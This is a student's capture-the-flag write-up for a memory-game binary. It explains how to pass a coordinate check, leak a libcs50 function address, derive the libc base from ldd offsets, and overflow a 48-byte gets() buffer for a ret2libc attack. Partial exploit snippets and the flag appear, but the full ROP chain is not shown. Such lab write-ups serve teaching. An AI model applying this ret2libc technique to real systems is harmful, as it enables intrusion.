# bin11:Solution

This challenge was similar to my own (bin3), bin2, and the ret2libc challenge from earlier this semester. There are a few key differences that made this one far more difficult than it should have been (for me anyway)

The binary is compiled with NX and Partial RELRO
```
checksec 4memory_vr
[*] '/root/workspace/vuln/midterm/ctfd/tyler/4memory_vr'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The initial output when the program is run is:
```
Welcome to Memory! Ready Player 8389928...
Here's the board:
    0   1   2   3
0 | $ | $ | $ | $ 
-----------------
1 | $ | $ | $ | $ 
-----------------
2 | $ | $ | $ | $ 
-----------------
3 | $ | $ | $ | $ 
-----------------
Choose an option: 
(F) Find a match 
(Q) Quit 
Choice:
```

Once you choose F you are prompted to enter two sets of coordinates. Looking at the binary in binja we can see that they need to be set to specific values to pass through to the exploitable portion of the program.
```
00401305      printf(format: "Pick first card (row, column): ")
00401324      __isoc99_scanf(format: "%d,%d", &var_60, &var_64)
00401338      printf(format: "Pick second card (row, column): ")
00401357      __isoc99_scanf(format: "%d,%d", &var_68, &var_6c)
00401386      if (var_60 == 1337 && var_68 == 31337 && var_64 == 31337 && var_6c == 1337)
```

The valid input is:
1337, 31337   
31337, 1337

The the program prints out the location of the function get_long_long. This function isn't part of libc. When trying to run locally, the program shows that it is looking for "libcs50". (I was unable to reproduce this for this report because I'd already added libcs50 to my path)

The libcs50 library has the funtion get_long_long. So we save the output of it's location locally and then symbolically find the location of get_long_long one the remote server. 
```
remote_get = int(p.recvline(), 16)

local_get = libcs.sym['get_long_long']
```

Using these values we can get the base address of libcs50. Then we need to get the base address of libc so that we can get to the gadgets we need. The pop rdi gadget isn't in libcs50.
```
ropper -f libcs50.so | grep pop
0x0000000000001884: pop rbp; clc; leave; ret; 
0x00000000000011f3: pop rbp; ret; 
```

This part took the most time due to the fact that the computer I was working on has issues with ldd. Most of the time it doesn't work, and this time it was pretty vital to the solve. 

ldd gave this output:
```
laptop: bin11$ ldd 4memory_vr_patched
        linux-vdso.so.1 (0x00007ffeb6948000)
        libcs50.so.11 => ./libcs50.so.11 (0x00007f89306ea000)
        libc.so.6 => ./libc.so.6 (0x00007f8930509000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f89306f1000)
```
 
However the output changes everytime it's run:
```
laptop: bin11$ ldd 4memory_vr_patched
        linux-vdso.so.1 (0x00007ffc2b1c1000)
        libcs50.so.11 => ./libcs50.so.11 (0x00007fa5847e8000)
        libc.so.6 => ./libc.so.6 (0x00007fa584607000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa5847ef000)
laptop: bin11$ ldd 4memory_vr_patched
        linux-vdso.so.1 (0x00007ffec3d20000)
        libcs50.so.11 => ./libcs50.so.11 (0x00007ff012535000)
        libc.so.6 => ./libc.so.6 (0x00007ff012354000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ff01253c000)
laptop: bin11$ ldd 4memory_vr_patched
        linux-vdso.so.1 (0x00007fff46f5a000)
        libcs50.so.11 => ./libcs50.so.11 (0x00007fc42b051000)
        libc.so.6 => ./libc.so.6 (0x00007fc42ae70000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fc42b058000)
```

However the distance between libc and libcs50 is consistent so we can just use one output to calculate the difference between the two. 
```
ldd_cs50 = int(0x00007f89306ea000)
ldd_libc = int(0x00007f8930509000)

# libc offset (difference between libc and libcs50
offset_libc = ldd_cs50 - ldd_libc
```

Then we can use the base address of libcs50 and the difference between it and libc to get the base address of libc. 
```
# libc base address of running program
base = offset_cs50 - offset_libc
```

Looking at the program in binja we can get the size of the buffer to overflow 48 + base pointer = 56
```
004013db  488d45d0           lea     rax, [rbp-48 {var_38}]
004013df  4889c7             mov     rdi, rax {var_38}
004013e2  b800000000         mov     eax, 0x0
004013e7  e8a4fcffff         call    gets
```

From here I could use the exact same lines of code I've used for a number of challenges and get the flag!
```
flag{d0_u_b3li3v3}
```

Resources:
* my own [challenge](https://github.com/kourtnee/VR_HW/tree/main/Midterm/bin3)
* the [ret2libc]() challenge
* BIG thanks to Louie for sending me the output of ldd so that I could calculate the distance between the libararies (all ldd output in this report comes from his laptop via discord)
* Tyler sent me the slides from his my-first-pwn presentation which helped with figuring out how to calculate the base addresses
* https://github.com/cs50/libcs50
